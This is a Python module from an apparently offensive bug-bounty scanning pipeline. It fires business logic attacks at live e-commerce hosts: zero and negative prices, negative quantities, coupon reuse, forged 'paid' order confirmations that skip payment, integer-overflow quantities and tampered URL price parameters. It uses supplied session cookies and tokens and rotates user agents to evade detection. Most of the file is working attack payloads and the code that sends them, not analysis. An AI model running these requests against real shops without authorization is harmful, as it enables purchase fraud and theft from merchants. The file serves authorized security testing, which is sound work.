#!/usr/bin/env python3
# modules/step38_business_logic.py — Business Logic Vulnerability Testing
# NEW MODULE: price manipulation, negative quantities, workflow bypass,
#             coupon stacking, refund abuse, limit bypass
# Source: Bug Bounty Bootcamp Ch17 — business logic methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, json, time, urllib.request, urllib.error, urllib.parse
from core.utils import safe_read

# ── Business logic test endpoints ────────────────────────────────────────────
CART_PATHS = [
    "/api/cart","/api/cart/add","/cart","/api/order",
    "/api/basket","/basket","/api/checkout","/checkout",
]
COUPON_PATHS = [
    "/api/coupon","/api/coupon/apply","/api/promo",
    "/coupon","/api/discount","/api/voucher",
    "/api/referral","/api/code/apply",
]
PAYMENT_PATHS = [
    "/api/payment","/api/pay","/api/purchase",
    "/api/order/confirm","/api/checkout/complete",
    "/payment","/api/transaction",
]
ACCOUNT_PATHS = [
    "/api/account/balance","/api/wallet","/api/credits",
    "/api/user/credits","/api/transfer","/api/withdraw",
]

# ── Business logic payloads ───────────────────────────────────────────────────
PRICE_MANIPULATIONS = [
    {"price": 0},           {"price": -1},
    {"price": 0.001},       {"price": -100},
    {"amount": 0},          {"amount": -1},
    {"total": 0},           {"cost": 0},
    {"price": "0"},         {"price": None},
]

QUANTITY_MANIPULATIONS = [
    {"quantity": -1},       {"quantity": -100},
    {"quantity": 0},        {"quantity": 99999},
    {"qty": -1},            {"count": -1},
    {"amount": -1},
]

COUPON_ATTACKS = [
    # Stacking attack — apply same coupon twice
    "SAVE10", "DISCOUNT20", "FREE", "100OFF",
    "PROMO", "SPECIAL", "VIP", "ADMIN",
]

WORKFLOW_BYPASS_PATTERNS = [
    # Skip payment step — go directly to order confirmation
    ("/api/order/confirm",  {"status": "paid",    "order_id": 1}),
    ("/api/checkout/done",  {"payment": "success","order_id": 1}),
    ("/api/purchase/final", {"paid": True,         "id": 1}),
]

# ── Detection patterns ────────────────────────────────────────────────────────
SUCCESS_INDICATORS = [
    re.compile(r'"status"\s*:\s*"(?:success|ok|completed)"', re.I),
    re.compile(r'"order_id"\s*:\s*\d+',                       re.I),
    re.compile(r'"confirmation"',                              re.I),
    re.compile(r'"success"\s*:\s*true',                        re.I),
    re.compile(r'"credited"\s*:\s*true',                       re.I),
]


class Step38BusinessLogic:
    """
    Business Logic Vulnerability scanner.
    Bug Bounty Bootcamp Ch17:
    1. Price manipulation (negative, zero, float)
    2. Negative quantity (credit abuse)
    3. Coupon stacking (apply same code multiple times)
    4. Workflow bypass (skip payment step)
    5. Limit bypass (apply coupon after max uses)
    6. Integer overflow attacks
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("bizlogic_results",
                             f"{p.out}/{p.prefix}_business_logic.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        urls  = safe_read(p.files.get("urls",""))
        found = 0

        if not live:
            p.log.warn("BizLogic: no live hosts"); return

        auth_h = self._build_auth(p)
        p.log.info(f"Business Logic V7: {len(live)} hosts — price+quantity+coupon+workflow")

        for host in live[:5]:
            host = host.rstrip("/")

            # Phase 1: Price manipulation
            r = self._test_price_manipulation(host, auth_h, out)
            found += r

            # Phase 2: Negative quantity
            r = self._test_negative_quantity(host, auth_h, out)
            found += r

            # Phase 3: Coupon stacking
            r = self._test_coupon_stacking(host, auth_h, out)
            found += r

            # Phase 4: Workflow bypass
            r = self._test_workflow_bypass(host, auth_h, out)
            found += r

            # Phase 5: Integer overflow
            r = self._test_integer_overflow(host, auth_h, out)
            found += r

            p.bypass.jitter()

        # Phase 6: Logic bugs from crawled URLs
        found += self._test_url_logic(urls[:50], auth_h, out)

        p.log.success(f"Business Logic V7: {found} findings")

    # ── Phase 1: Price manipulation ───────────────────────────────────────────
    def _test_price_manipulation(self, host, auth_h, out) -> int:
        found = 0
        for path in CART_PATHS + PAYMENT_PATHS:
            url = host + path
            baseline = self._post_json(url, {"price": 100, "quantity": 1,
                                             "product_id": 1}, auth_h)
            if not baseline or baseline.get("status",0) == 404:
                continue

            for payload in PRICE_MANIPULATIONS:
                resp = self._post_json(url, {**payload, "quantity": 1,
                                             "product_id": 1}, auth_h)
                if not resp: continue
                st   = resp.get("status",0)
                body = resp.get("body","")

                if st in (200,201) and any(p.search(body) for p in SUCCESS_INDICATORS):
                    price_val = list(payload.values())[0]
                    detail = (f"Price Manipulation: {list(payload.keys())[0]}="
                              f"{price_val} accepted at {path}")
                    self._save(out,"critical","PRICE_MANIPULATION",url,detail)
                    found += 1
                    break
        return found

    # ── Phase 2: Negative quantity ────────────────────────────────────────────
    def _test_negative_quantity(self, host, auth_h, out) -> int:
        found = 0
        for path in CART_PATHS:
            url = host + path
            for payload in QUANTITY_MANIPULATIONS:
                resp = self._post_json(url,
                    {**payload, "product_id": 1, "price": 10}, auth_h)
                if not resp: continue
                st   = resp.get("status",0)
                body = resp.get("body","")

                # Negative quantity accepted = credit abuse
                if st in (200,201) and any(p.search(body) for p in SUCCESS_INDICATORS):
                    val    = list(payload.values())[0]
                    detail = (f"Negative Quantity: {list(payload.keys())[0]}="
                              f"{val} accepted — credit abuse possible")
                    self._save(out,"high","NEGATIVE_QUANTITY",url,detail)
                    found += 1
                    break
        return found

    # ── Phase 3: Coupon stacking ──────────────────────────────────────────────
    def _test_coupon_stacking(self, host, auth_h, out) -> int:
        found = 0
        for path in COUPON_PATHS:
            url = host + path
            probe = self._post_json(url, {"code": COUPON_ATTACKS[0]}, auth_h)
            if not probe or probe.get("status",0) == 404:
                continue

            # Apply same coupon twice
            for code in COUPON_ATTACKS[:5]:
                r1 = self._post_json(url, {"code": code, "coupon_code": code,
                                           "voucher": code}, auth_h)
                if not r1 or r1.get("status",0) not in (200,201):
                    continue
                body1 = r1.get("body","")
                if "already" in body1.lower() or "used" in body1.lower():
                    continue

                # Try applying the same code again
                time.sleep(0.3)
                r2 = self._post_json(url, {"code": code, "coupon_code": code,
                                           "voucher": code}, auth_h)
                if not r2: continue
                body2 = r2.get("body","")

                if (r2.get("status",0) in (200,201) and
                        any(p.search(body2) for p in SUCCESS_INDICATORS)):
                    detail = (f"Coupon Stacking: code='{code}' applied twice "
                              f"at {path} — no one-use enforcement")
                    self._save(out,"high","COUPON_STACKING",url,detail)
                    found += 1
                    break
        return found

    # ── Phase 4: Workflow bypass ──────────────────────────────────────────────
    def _test_workflow_bypass(self, host, auth_h, out) -> int:
        """
        BB Bootcamp Ch17: skip payment step by POSTing
        directly to confirmation endpoint with status=paid.
        """
        found = 0
        for path, payload in WORKFLOW_BYPASS_PATTERNS:
            url  = host + path
            resp = self._post_json(url, payload, auth_h)
            if not resp: continue
            st   = resp.get("status",0)
            body = resp.get("body","")

            if st in (200,201) and any(p.search(body) for p in SUCCESS_INDICATORS):
                detail = (f"Workflow Bypass: POST {path} with "
                          f"{json.dumps(payload)[:60]} accepted — "
                          f"payment step skipped")
                self._save(out,"critical","WORKFLOW_BYPASS",url,detail)
                found += 1
        return found

    # ── Phase 5: Integer overflow ──────────────────────────────────────────────
    def _test_integer_overflow(self, host, auth_h, out) -> int:
        found = 0
        overflow_vals = [
            2**31 - 1,     # INT_MAX
            2**31,         # INT_MAX + 1 → negative
            2**32,         # UINT_MAX + 1
            2**63 - 1,     # BIGINT_MAX
            9999999999999, # Large number
        ]
        for path in CART_PATHS[:3]:
            url = host + path
            for val in overflow_vals[:3]:
                resp = self._post_json(url,
                    {"quantity": val, "product_id": 1}, auth_h)
                if not resp: continue
                st   = resp.get("status",0)
                body = resp.get("body","")

                if st in (200,201):
                    # Check if overflow resulted in negative/zero price
                    if re.search(r'"(?:price|total|amount)"\s*:\s*-?\d', body):
                        detail = (f"Integer Overflow: quantity={val} at {path} "
                                  f"— may result in negative price")
                        self._save(out,"high","INTEGER_OVERFLOW",url,detail)
                        found += 1
                        break
        return found

    # ── Phase 6: URL-based logic bugs ────────────────────────────────────────
    def _test_url_logic(self, urls: list, auth_h: dict, out: str) -> int:
        found = 0
        # Look for price/quantity params in crawled URLs
        price_re = re.compile(r'[?&](price|amount|cost|total|qty|quantity)=(\d+)', re.I)
        for url in urls:
            m = price_re.search(url)
            if not m: continue
            param, val = m.group(1), m.group(2)

            # Try setting to 0 and -1
            for new_val in ["0","-1","0.001"]:
                test_url = re.sub(
                    rf'([?&]{re.escape(param)}=)\d+',
                    rf'\g<1>{new_val}', url)
                resp = self._get(test_url, auth_h)
                if not resp: continue
                st = resp.get("status",0)
                body = resp.get("body","")
                if st in (200,201) and any(p.search(body) for p in SUCCESS_INDICATORS):
                    detail = (f"URL Price Logic: {param}={new_val} "
                              f"accepted (was {val})")
                    self._save(out,"high","URL_PRICE_LOGIC",test_url,detail)
                    found += 1
                    break
        return found

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
        if c: hdrs["Cookie"] = c
        if a: hdrs["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        return hdrs

    def _post_json(self, url, data, auth, timeout=8) -> dict:
        try:
            body = json.dumps(data).encode()
            hdrs = {**auth, "Content-Type":"application/json",
                    "User-Agent": self.p.bypass.ua()}
            req  = urllib.request.Request(url, data=body, headers=hdrs, method="POST")
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(20000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(2000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None

    def _get(self, url, auth, timeout=8) -> dict:
        try:
            req  = urllib.request.Request(
                url, headers={**auth, "User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body": resp.read(20000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": ""}
        except Exception:
            return None

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "bizlogic-v7", response=response, payload=payload)
